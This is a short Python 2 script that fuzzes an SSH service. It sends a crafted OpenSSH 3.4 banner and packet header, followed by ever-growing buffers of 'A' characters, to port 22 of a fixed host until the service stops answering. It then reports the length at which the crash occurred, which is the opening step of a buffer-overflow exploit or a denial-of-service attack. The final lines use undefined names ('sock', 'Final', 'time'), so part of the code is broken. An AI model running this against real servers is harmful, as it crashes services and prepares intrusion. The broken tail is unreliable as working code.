#!/usr/bin/python

import sys, socket
from time import sleep


Pre= ("\x53\x53\x48\x2d\x31\x2e\x39\x39\x2d\x4f\x70\x65\x6e\x53\x53\x48"
       "\x5f\x33\x2e\x34\x0a\x00\x00\x4f\x04\x05\x14\x00\x00\x00\x00\x00"
       "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07\xde")

buffer = "A" * 100

eob = "\r\n"


while True: 
        try: 
             s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
             s.connect(('192.168.43.156',22))
             print "Trying with buffer length %d" % len(buffer)
             s.send((Pre + buffer + eob))
             s.recv(1024)
             s.close()
             
             buffer=buffer + "A"*100


        except: 
                print("Fuzzing Crashed at %s by" % str(len(buffer)))
                sys.exit()     
sock.send(Final )

time.sleep(5)

sock.close()





